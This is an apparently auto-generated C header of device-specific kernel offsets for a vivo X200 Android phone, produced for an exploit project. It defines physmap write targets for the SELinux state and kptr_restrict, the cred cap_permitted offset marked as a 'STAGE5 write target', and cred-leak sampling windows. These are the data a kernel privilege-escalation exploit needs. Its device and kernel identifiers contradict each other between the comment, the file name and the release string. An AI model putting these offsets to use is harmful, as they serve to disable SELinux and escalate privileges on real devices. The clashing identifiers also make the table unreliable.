/*
 * SPDX-License-Identifier: Apache-2.0
 * Copyright 2026 GhostLock-X200-App contributors
 *
 * devices_pd2458.h — 机型硬编码偏移表（由 tools/gen_device_header.py 生成）。
 *
 * 来源：PC 版机型模块 devices/x200_b57/
 *   device.json  kernel_release = 6.6.89-android15-8-gb57af212129c-abogki457297774-4k
 *   device.json  device = vivo X200 (PD2415)  verified = True
 *   notes: 真机已验证 (X200 PD2415 16.1.12.2.W10)。值来源: exploit/src/target_x200.h + tools/offset_tools/win_offs_b57.json。
 * 生成：tools/gen_device_header.py
 * 警告：本文件为自动生成，请勿手改偏移；重生成请重跑
 *   python3 tools/gen_device_header.py <pc_root> x200_b57
 */
#ifndef DEVICES_X200_B57_H
#define DEVICES_X200_B57_H

#define DEV_KERNEL_RELEASE \
    "6.6.89-android15-8-gpd2458-demo-release-4k"

/* ---- physmap 基址与符号偏移（win_offs.json / offsets.json） ---- */
#define DEV_PHYSMAP_BASE      0xffffff8000000000
#define DEV_SELINUX_STATE_OFF 0x2346ee8ULL
#define DEV_KPTR_RESTRICT_OFF 0x210bd20ULL
#define DEV_ZEROES_BUF_OFF    0x2342820ULL

/* 派生写目标（编译期算好，运行时直接用） */
#define DEV_SE_P0        (DEV_PHYSMAP_BASE + DEV_SELINUX_STATE_OFF)
#define DEV_W0           (DEV_PHYSMAP_BASE + DEV_KPTR_RESTRICT_OFF - 8)
#define DEV_GL_LOCK_BASE (DEV_PHYSMAP_BASE + DEV_ZEROES_BUF_OFF)

/* GL 槽位 */
#define DEV_GL_SLOT_SIZE 0x10ULL
#define DEV_GL_SLOT_BAD  1

/* task_struct->cred 内 cap_permitted 偏移（STAGE5 写目标） */
#define DEV_CAP_OFF 56

/* w2host 采样窗口（cred 泄漏） */
#define DEV_W2_IP_LO   0xcba0cULL
#define DEV_W2_IP_HI   0xcc7d4ULL
#define DEV_W2_CRED_IPS { 0xcbc0cULL, 0xcbc10ULL, 0xcbc14ULL, 0xcbc18ULL, 0xcbc1cULL, 0xcc5b0ULL, 0xcc5d4ULL }
#define DEV_W2_CAND_MIN_ADD 0x40000000ULL

/* clear_vr_tag 参数（默认值；如 PC 模块带 vr_offsets.json 则以其为准） */
#define DEV_VR_TAG_A 6
#define DEV_VR_TAG_B 44
#define DEV_VR_TP    1024

/* capsym 筛选窗口（相对 kbase，同 offsets_auto.py live 提取） */
#define DEV_CAPSYM_WIN 0x4000000ULL

#endif /* DEVICES_X200_B57_H */
